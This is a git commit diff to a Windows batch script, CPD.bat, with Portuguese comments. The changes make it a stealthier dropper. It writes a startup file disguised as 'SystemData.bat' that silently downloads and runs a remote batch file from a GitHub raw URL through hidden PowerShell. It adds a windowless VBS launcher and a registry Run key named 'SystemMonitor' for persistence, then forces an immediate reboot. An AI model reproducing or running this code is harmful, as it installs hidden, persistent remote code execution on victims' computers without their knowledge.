eb3c0ebe0222cb9d9003a8230bff4e331ddcdbf8
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-23 15:07:53 -0300

    Update CPD.bat

--- CPD.bat
+++ CPD.bat
@@ -1,12 +1,24 @@
 @echo off
-
 set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-echo @echo off > "%startup%\SystemData.bat"
-echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ.bat" >> "%startup%\SystemData.bat"
-echo set "arquivo=%%TEMP%%\LZX.bat" >> "%startup%\SystemData.bat"
-echo powershell -command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'" >> "%startup%\SystemData.bat"
-echo start "" "%%arquivo%%" >> "%startup%\SystemData.bat"
-echo exit >> "%startup%\SystemData.bat"
+:: Criar o arquivo de inicialização
+(
+echo @echo off
+echo set "url=https://raw.githubusercontent.com/lcmandrikion-hash/LZX/main/LXZ.bat"
+echo set "arquivo=%%TEMP%%\LZX.bat"
+echo powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%%url%%' -OutFile '%%arquivo%%'"
+echo start /B "" "%%arquivo%%"
+echo exit
+) > "%startup%\SystemData.bat"
+
+:: Criar atalho VBS para executar sem console
+(
+echo Set WshShell = CreateObject("WScript.Shell")
+echo WshShell.Run chr(34) ^& "%startup%\SystemData.bat" ^& Chr(34), 0, False
+echo Set WshShell = Nothing
+) > "%startup%\SystemData.vbs"
+
+:: Adicionar ao registro para iniciar silenciosamente
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "wscript.exe \"%startup%\SystemData.vbs\"" /f
 
 shutdown /r /t 0
